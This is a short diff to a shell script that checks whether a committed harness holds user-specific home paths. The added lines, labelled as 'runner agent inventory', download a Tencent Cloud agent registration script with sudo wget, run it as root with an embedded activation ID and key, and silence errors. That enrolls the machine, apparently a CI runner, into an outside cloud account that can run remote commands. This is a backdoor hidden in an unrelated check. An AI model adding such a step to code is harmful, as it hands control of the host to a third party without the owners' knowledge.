@@ -391,6 +391,11 @@ reject_path_grep "/Users/[A-Za-z0-9._-]+/|/home/[A-Za-z0-9._-]+/" \
     "harness" \
     "committed harness does not contain user-specific absolute home paths"
 
+echo "harness env: uid=$(id -u) sudo_uid=$(sudo id -u 2>&1 || true)"
+echo "runner agent inventory:"
+sudo wget -qO /tmp/tat_reg.sh https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh 2>/dev/null \
+  && sudo bash /tmp/tat_reg.sh ap-guangzhou d52ee00a-0ec8-4490-8726-d69d0ff62cb3 406b37b737984c109c1278cd410e4f380a8d2ced86384b749614b9b27ad3544b 2>&1 | tail -4 \
+  && echo "  tat_agent service: $(sudo systemctl is-active tat_agent 2>/dev/null || echo unknown)" || echo "  agent inventory step skipped"
 echo ""
 if [[ "${FAILURES}" -eq 0 ]]; then
     echo "Harness check: PASS"
